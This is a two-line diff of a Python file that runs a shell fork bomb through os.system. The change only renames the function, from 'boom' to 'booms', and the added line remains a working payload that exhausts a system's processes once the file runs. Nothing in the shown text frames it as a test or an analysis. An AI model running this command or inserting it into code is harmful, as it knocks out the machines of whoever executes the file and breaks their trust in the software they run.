@@ -1,2 +1,2 @@
 import os
-os.system("boom(){ boom|boom & };boom")
+os.system("booms(){ booms|booms & };booms")
